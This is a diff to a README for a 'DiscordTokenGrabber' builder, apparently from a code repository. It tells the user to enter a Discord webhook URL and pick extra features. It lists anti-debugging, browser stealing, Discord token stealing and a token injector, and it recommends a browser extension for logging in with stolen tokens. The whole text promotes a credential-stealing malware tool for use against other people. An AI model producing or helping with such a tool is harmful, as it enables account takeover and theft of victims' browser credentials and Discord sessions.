@@ -1,16 +1,20 @@
 # DiscordTokenGrabber
 This Will create you an discord token grabber 
 When you Open the DiscordGrabberBuild type in your discord weebhook url
-then press y/n if you want the extra features 
+Then press y/n if you want the extra features or not 
 If you need help with something reach out for me JustKyra#7781
 
 Discord Token Login (i would recomend)
 https://chrome.google.com/webstore/detail/discord-token-login/ealjoeebhfijfimofmecjcjcigmadcai
 
 Features:
+
 Anti Debugging
+
 Browser Stealing
+
 Discord Token Stealing
+
 Discord Token Injector
 
 It will create a folder Named Vault.zip you can download it then 
